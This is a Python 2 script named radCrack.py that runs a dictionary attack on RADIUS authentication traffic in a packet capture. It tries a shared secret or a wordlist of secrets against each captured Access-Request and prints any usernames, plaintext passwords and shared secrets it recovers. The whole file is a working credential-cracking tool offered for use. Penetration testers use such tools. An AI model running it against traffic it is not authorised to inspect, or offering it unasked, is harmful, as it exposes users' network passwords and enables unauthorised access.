import sys
import hashlib
import dpkt
import socket

def rad_decrypt(sec,auth,crypt):
  m = hashlib.md5()
  m.update(sec+auth)
  m = m.digest()
  password = ""
  for i in range(len(crypt)):
    password += chr(ord(m[i])^ord(crypt[i]))
  return password  

def is_ascii(s):
  return all((ord(c) < 128 and ord(c) >31) or ord(c)==0 for c in s)

def crack_pcap(secretlist, pcapFile):
  p = open(pcapFile, "rb")
  pcap = dpkt.pcap.Reader(p)
  for ts, buf in pcap:
    eth= dpkt.ethernet.Ethernet(buf)
    ip = eth.data
    udp = ip.data
    if type(udp)==dpkt.udp.UDP and udp.dport==1812:
      auth = udp.data[4:20]
      cur = 20
      curlen = ord(udp.data[cur+1:cur+2])
      username = "Not Found"
      while ord(udp.data[cur:cur+1])!=2:
        if ord(udp.data[cur:cur+1])==1:
          username = udp.data[cur+2:cur+curlen]
        cur += curlen
        curlen = ord(udp.data[cur+1:cur+2])
      crypt = udp.data[cur+2:cur+curlen]
      all_passwords = {}
      for secret in secretlist:
        secret = secret.strip()
        curpass = auth
        password = ""
        i = 0
        while i < len(crypt):
          password += rad_decrypt(secret,curpass,crypt[i:i+16])
          curpass = crypt[i:i+16]
          i+=16
        if is_ascii(password):
          all_passwords[secret]=password
          print " "
          print "[*] Possible Radius Password Found"
          print "[*] Radius Server: "+socket.inet_ntoa(ip.dst)
          print "[*] Username: "+username          
          print "[*] Password: "+password
          print "[*] Shared Secret: "+secret  
          print " "

  p.close()
  print "[*] DONE "
  return (username, all_passwords)

def usage():
  print "[*] USAGE:"
  print "python radCrack.py sharedsecret pcapfile"
  print " or "
  print "python radCrack.py -w secretlist pcapfile"
  print " "



if len(sys.argv)==4 and sys.argv[1] == "-w":
  if sys.argv[2] == "-":
    f = sys.stdin
  else:
    f = open(sys.argv[2])
  secrets = f.readlines()
  file = sys.argv[3]
  f.close()
  crack_pcap(secrets, file)
elif len(sys.argv)==3:
  secret = sys.argv[1]
  file = sys.argv[2]
  crack_pcap([secret], file)
else:
  usage()
